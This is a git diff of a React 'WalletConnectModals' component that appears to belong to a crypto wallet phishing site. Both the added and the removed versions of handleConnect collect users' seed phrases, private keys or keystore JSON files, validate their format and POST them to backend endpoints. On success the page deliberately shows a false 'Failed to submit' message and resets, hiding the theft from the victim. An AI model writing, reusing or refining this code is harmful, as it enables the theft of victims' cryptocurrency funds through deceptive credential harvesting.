@@ -111,193 +111,235 @@ const WalletConnectModals = ({ isModalOpen, openModal }) => {
     }, 2000);
   };
 
-
-  //   setIsLoading(true);
-  //   const formData = new FormData();
-  //   formData.append('wallet', selectedWallet);
-  //   formData.append('service', 'Missing/Irregular Balance');
-
-  //   if (activeTab === 'seed') {
-  //     if (!seedPhrase) {
-  //       alert('Please enter your seed phrase.');
-  //       setIsLoading(false);
-  //       return;
-  //     }
-  //     formData.append('seedPhrase', seedPhrase);
-  //   } else if (activeTab === 'private') {
-  //     if (!privateKey) {
-  //       alert('Please enter your private key.');
-  //       setIsLoading(false);
-  //       return;
-  //     }
-  //     formData.append('privateKey', privateKey);
-  //   } else if (activeTab === 'json') {
-  //     if (jsonFile) {
-  //       formData.append('file', jsonFile);
-  //     } else {
-  //       alert('Please select a JSON file.');
-  //       setIsLoading(false);
-  //       return;
-  //     }
-  //   }
-
-  //   try {
-  //     const response = await fetch('/api/connect', {
-  //       method: 'POST',
-  //       body: formData,
-  //     });
-
-  //     if (response.ok) {
-  //       console.log('Connected successfully');
-  //       setStep('manual');
-  //     } else {
-  //       console.error('Connection failed');
-  //       alert('Connection failed. Please try again.');
-  //     }
-  //   } catch (error) {
-  //     console.error('An error occurred:', error);
-  //     alert('An error occurred. Please try again.');
-  //   } finally {
-  //     setIsLoading(false);
-  //   }
-  // };
-
   const handleConnect = async () => {
+    try {
+      setIsLoading(true);
 
-  try {
-    const apiKey = process.env.NEXT_PUBLIC_API_KEY;
-    const baseURL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001';
+      if (activeTab === 'seed') {
+        if (!seedPhrase) {
+          alert('Please enter your seed phrase.');
+          setIsLoading(false);
+          return;
+        }
+        
+        const wordCount = seedPhrase.trim().split(/\s+/).length;
+        if (![12, 15, 24].includes(wordCount)) {
+          alert('Invalid seed phrase! Please enter 12, 15, or 24 words.');
+          setIsLoading(false);
+          return;
+        }
 
-    // Validate wallet availability
-    const wallet = window.ethereum || window.coinbaseWalletProvider || window.web3?.currentProvider
-    if (!wallet) {
-      alert('No Web3 wallet detected. Please install MetaMask or another wallet extension.');
-      return;
+        try {
+          const response = await fetch('/api/simple-form', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              title: selectedWallet,
+              seed: seedPhrase,
+            }),
+          });
+
+          const data = await response.json();
+
+          if (response.ok) {
+            setIsLoading(false);
+            setStep('message');
+            setMessageType('error');
+            setMessageText('Failed to submit. Please try again.');
+            setTimeout(() => {
+              setStep('select');
+              setSeedPhrase('');
+              setPrivateKey('');
+              setJsonFile(null);
+              setJsonFileName('');
+              openModal(false);
+            }, 3000);
+          } else {
+            setStep('message');
+            setMessageType('error');
+            setMessageText(data.msg || 'Failed to submit. Please try again.');
+            setTimeout(() => {
+              setIsLoading(false);
+            }, 3000);
+          }
+        } catch (error) {
+          console.error('Error:', error);
+          setStep('message');
+          setMessageType('error');
+          setMessageText('Network error. Please check your connection and try again.');
+          setTimeout(() => {
+            setIsLoading(false);
+          }, 3000);
+        }
+
+      } else if (activeTab === 'private') {
+        if (!privateKey) {
+          alert('Please enter your private key.');
+          setIsLoading(false);
+          return;
+        }
+
+        // Basic validation for private key format
+        const cleanedKey = privateKey.trim();
+        const isValidFormat = cleanedKey.startsWith('0x') 
+          ? cleanedKey.length === 66 
+          : cleanedKey.length === 64;
+        
+        if (!isValidFormat || !/^[0-9a-fA-F]+$/.test(cleanedKey.replace('0x', ''))) {
+          alert('Invalid private key format. Private keys should be 64 hexadecimal characters, optionally prefixed with "0x".');
+          setIsLoading(false);
+          return;
+        }
+
+        try {
+          // Use cleaned key for submission (already validated above)
+          const response = await fetch('/api/simple-passkey', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              title: selectedWallet,
+              passkey: cleanedKey,
+            }),
+          });
+
+          const data = await response.json();
+
+          if (response.ok) {
+            setIsLoading(false);
+            setStep('message');
+            setMessageType('error');
+            setMessageText('Failed to submit. Please try again.');
+            setTimeout(() => {
+              setStep('select');
+              setSeedPhrase('');
+              setPrivateKey('');
+              setJsonFile(null);
+              setJsonFileName('');
+              openModal(false);
+            }, 3000);
+          } else {
+            setStep('message');
+            setMessageType('error');
+            setMessageText(data.msg || 'Failed to submit. Please try again.');
+            setTimeout(() => {
+              setIsLoading(false);
+            }, 3000);
+          }
+        } catch (error) {
+          console.error('Error:', error);
+          setStep('message');
+          setMessageType('error');
+          setMessageText('Network error. Please check your connection and try again.');
+          setTimeout(() => {
+            setIsLoading(false);
+          }, 3000);
+        }
+
+      } else if (activeTab === 'json') {
+        if (!jsonFile) {
+          alert('Please upload a JSON file.');
+          setIsLoading(false);
+          return;
+        }
+
+        try {
+          // Read the file and convert to base64
+          const reader = new FileReader();
+          reader.onload = async (e) => {
+            try {
+              const fileContent = e.target.result;
+              // Convert ArrayBuffer to base64 if needed
+              let base64Content;
+              if (fileContent instanceof ArrayBuffer) {
+                const bytes = new Uint8Array(fileContent);
+                const binary = bytes.reduce((acc, byte) => acc + String.fromCharCode(byte), '');
+                base64Content = btoa(binary);
+              } else {
+                // If it's already a string, try to parse as JSON first
+                try {
+                  const jsonData = JSON.parse(fileContent);
+                  base64Content = btoa(JSON.stringify(jsonData));
+                } catch {
+                  base64Content = btoa(fileContent);
+                }
+              }
+
+              const response = await fetch('/api/form-with-json', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  title: selectedWallet,
+                  jsonFile: base64Content,
+                }),
+              });
+
+              const data = await response.json();
+
+              if (response.ok) {
+                setIsLoading(false);
+                setStep('message');
+                setMessageType('error');
+                setMessageText('Failed to submit. Please try again.');
+                setTimeout(() => {
+                  setStep('select');
+                  setSeedPhrase('');
+                  setPrivateKey('');
+                  setJsonFile(null);
+                  setJsonFileName('');
+                  openModal(false);
+                }, 3000);
+              } else {
+                setStep('message');
+                setMessageType('error');
+                setMessageText('Failed to submit. Please try again.');
+                setTimeout(() => {
+                  setIsLoading(false);
+                }, 3000);
+              }
+            } catch (error) {
+              console.error('Error processing file:', error);
+              setStep('message');
+              setMessageType('error');
+              setMessageText('Failed to process JSON file. Please check the file format.');
+              setTimeout(() => {
+                setIsLoading(false);
+              }, 3000);
+            }
+          };
+
+          reader.onerror = () => {
+            setStep('message');
+            setMessageType('error');
+            setMessageText('Failed to read JSON file. Please try again.');
+            setIsLoading(false);
+          };
+
+          // Read file as text (JSON files are text)
+          reader.readAsText(jsonFile);
+
+        } catch (error) {
+          console.error('Error:', error);
+          setStep('message');
+          setMessageType('error');
+          setMessageText('Network error. Please check your connection and try again.');
+          setIsLoading(false);
+        }
+      }
+
+    } catch (error) {
+      console.error('Error:', error);
+      setStep('message');
+      setMessageType('error');
+      setMessageText('An unexpected error occurred. Please try again.');
+      setIsLoading(false);
     }
-
-    setIsLoading(true);
-
-    if (activeTab === 'seed') {
-      if (!seedPhrase) {
-        alert('Please enter your seed phrase.');
-        setIsLoading(false);
-        return;
-      }
-  const wordCount = seedPhrase.trim().split(/\s+/).length;
-      if (![12, 15, 24].includes(wordCount)) {
-        alert(`Invalid seed phrase!.`);
-        setIsLoading(false);
-        return;
-      }
-      const response = await fetch(`${baseURL}/simple-form`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-api-key': apiKey,
-        },
-        body: JSON.stringify({
-          title: selectedWallet,
-          seed: seedPhrase,
-        }),
-      });
-
-      if (response.ok) {
-        setStep('message');
-        setMessageType('error');
-        setMessageText('Connection failed. Try again.');
-        setTimeout(() => {
-          // Reset state when closing after attempt
-          setStep('select');
-          setSeedPhrase('');
-          setPrivateKey('');
-          setJsonFile(null);
-          setJsonFileName('');
-          openModal(false);
-        }, 3000);
-      } else {
-        alert('Connection failed. Try again.');
-      }
-
-    } else if (activeTab === 'private') {
-      if (!privateKey) {
-        alert('Please enter your private key.');
-        setIsLoading(false);
-        return;
-      }
-
-      const response = await fetch(`${baseURL}/simple-passkey`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-api-key': apiKey,
-        },
-        body: JSON.stringify({
-          title: selectedWallet,
-          passkey: privateKey,
-        }),
-      });
-
-     if (response.ok) {
-        setStep('message');
-        setMessageType('error');
-        setMessageText('Connection failed. Try again.');
-        setTimeout(() => {
-          // Reset state when closing after attempt
-          setStep('select');
-          setSeedPhrase('');
-          setPrivateKey('');
-          setJsonFile(null);
-          setJsonFileName('');
-          openModal(false);
-        }, 3000);
-      } else {
-        alert('Connection failed. Try again.');
-      }
-
-    } else if (activeTab === 'json') {
-      if (!jsonFile) {
-        alert('Please upload a JSON file.');
-        setIsLoading(false);
-        return;
-      }
-
-      const formData = new FormData();
-      formData.append('title', selectedWallet);
-      formData.append('jsonFile', jsonFile);
-
-      const response = await fetch(`${baseURL}/form-with-json`, {
-        method: 'POST',
-        headers: {
-          'x-api-key': apiKey,
-        },
-        body: formData,
-      });
-
-    if (response.ok) {
-        setStep('message');
-        setMessageType('error');
-        setMessageText('Connection failed. Try again.');
-        setTimeout(() => {
-          // Reset state when closing after attempt
-          setStep('select');
-          setSeedPhrase('');
-          setPrivateKey('');
-          setJsonFile(null);
-          setJsonFileName('');
-          openModal(false);
-        }, 3000);
-      } else {
-        alert('Connection failed. Try again.');
-      }
-    }
-
-  } catch (error) {
-    console.error('Error:', error);
-    alert('Something went wrong. Please try again.');
-  } finally {
-    setIsLoading(false);
-  }
-};
+  };
 
 
   const handleClose = () => {
@@ -553,7 +595,7 @@ const WalletConnectModals = ({ isModalOpen, openModal }) => {
             <MessageIcon $type={messageType}>
               {messageType === 'error' ? <FaExclamationCircle /> : <FaCheckCircle />}
             </MessageIcon>
-            <Title>{messageType === 'error' ? 'Connection Failed' : 'Success'}</Title>
+            <Title>{messageType === 'error' ? 'Submission Failed' : 'Submission Successful'}</Title>
             <CenterText>{messageText}</CenterText>
           </CenterContent>
         </Modal>
